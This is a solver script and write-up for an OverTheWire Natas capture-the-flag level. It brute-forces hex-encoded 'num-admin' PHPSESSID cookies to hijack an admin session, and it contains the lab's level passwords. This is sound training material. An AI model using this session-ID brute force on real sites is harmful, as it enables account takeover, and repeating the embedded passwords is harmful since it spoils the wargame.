#! /usr/bin/python3


import requests
import binascii

#Functions
def cleanheaders(headers):
	for item in headers:
		# value=headers.get(item,'Not Found')
		# print(f'{item} : {value}')
		pass
	return (headers.get("Set-Cookie","error"))


#Basic Authentication
basic_username,basic_password='natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
#Custom Headers

def unhide(string):
	try:
		return (binascii.unhexlify(string))
	except:
		return 'Error'

error='You are logged in as a regular user. Login as an admin to retrieve credentials'


#Payload
path='/index.php'
url=host+path
content=error
final=''
print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
def getflag():
	for num in range(280,1000):
		global final
		global error
		global content
		someshit='admin'
		string=str(num)+f'-{someshit}'
		# string=str(num)+'-admin'
		somevalue=binascii.hexlify(string.encode()).decode()
		custom_headers={"Cookie":f"PHPSESSID={somevalue}"}
		# print(type(somevalue))
		session=requests.Session()
		# print(url)s
		payload={"username":someshit,"password":someshit}
		response=requests.post(url,headers=custom_headers,data=payload,auth=(basic_username,basic_password))
		print(payload)
		content=response.text
		status=response.status_code
		headers=response.headers
		headvalue=cleanheaders(headers)
		print(headvalue)
		# headvalue=headvalue.split('=')[1].split(';')[0]
		headvalue='3436312d61646d696e'
		print(f'[-] Trying => {str(somevalue)}  verify : {unhide(somevalue)} {final} header -> {headvalue} == {unhide(headvalue)}')
		
		# print(content)
		# print(content)
		if (error not in content):
			print(f'\t[+] Please check {str(num)}\n\n\n')
			final+=str(num)+','
			cleanheaders(headers)
			print(content)
			flag=content.split(' ')[48:51]
			
			print('\n'+''.join(flag))
			return headers
		else:
			pass


getflag()

# Trying 17287 => 3172872d7573657220



#WRITEUP
#This time we get a form telling us to login as admin
#Checking the source code,The program : 
#Start session function
#1.Checks for the PHPSESSID cookie
#2.Checks if the cookie is valid with is_numeric(cookie) Meaning cookie has to be a numeric value
#3. if 1 and 2 are true then start session
#4. Check if admin exists in the $SESSION
#4.If it does not exist set $SESSION["admin"] = 0 and return true

#Print flag function
#if $SESSION['admin'] = 1 then we can get the flag
#But for us to get the admin session variable to 1 ,we to get the function below to return 1

			# function isValidAdminLogin() { /* {{{ */
			#     if($_REQUEST["username"] == "admin") {
			#     /* This method of authentication appears to be unsafe and has been disabled for now. */
			#         //return 1;
			#     }

			#     return 0;
			# } 

#Which seems impossible since i dont know a way to break before reaching return 0;
#Then i saw $maxid = 640; // 640 should be enough for everyone 
# This is a small value,so i thought of brute force ,Assuming the admin is logged in ,we can get the flag

#And sure we get the flag



# prefix='3'	33838	suffix='2d7573657220'
# prefix='3'	13339	suffix='2d7573657220'
# prefix='3'	33434	suffix='2d7573657220'
# prefix='3'	13332	suffix='2d7573657220'
# prefix='3'	53834	suffix='2d7573657220'
# prefix='3'	43430	suffix='2d7573657220'


#3434302d7573657220


natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF